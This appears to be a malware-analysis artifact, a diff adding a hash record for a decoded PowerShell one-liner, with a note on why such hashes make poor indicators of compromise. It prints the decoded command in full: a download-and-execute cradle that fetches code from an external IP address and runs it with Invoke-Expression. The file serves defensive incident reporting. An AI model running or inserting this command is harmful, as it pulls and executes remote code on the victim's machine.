@@ -1,0 +1,20 @@
+HASHES — 2026-11-17
+===================
+Method: SHA256 over UTF-8 bytes of the exact string. Decode only; no execution.
+
+DECODED STRING
+  Invoke-WebRequest 'http://166.1.89.91/zap/' -UseBasicParsing | Invoke-Expression
+
+SHA256 (base64 blob, 108 chars)      : 6ccfc636a365453ccbc0e741d5c4a93dcc619c7cbd153f98072dd4b0163aabe8
+SHA256 (decoded, 80 chars, no EOL)   : c8c07a9457f5ce2d063c3ad4b7c6ef8e2ded2cb2d43f6a41d43b68c8b8d63763
+SHA256 (decoded + LF)                : 30264af60b5cd00d5f711bdc82a5075bf11ad7b14b47910384f6e2be1e6636d6
+SHA256 (decoded + CRLF)              : 146455cd416e7008b7d7d2f7149c6cd37b84d62c5f28b92f91a9f3a980cd04b2
+SHA256 (full one-liner as pasted)    : c64af60adc8ee3ab91fc9f1960da8b6a9822ad7a5629baacb0710aa9547db311
+
+NOTE FOR IOC SHARING
+--------------------
+None of these are file hashes. Hash-sharing these has little operational value
+because a re-encoded variant (different base64 padding, spacing, variable name)
+produces a different hash for identical behaviour. For this malware family the
+useful IOCs are the network strings and the behavioural pattern, not the hash.
+Recorded here for integrity of this report, not for blocklisting.
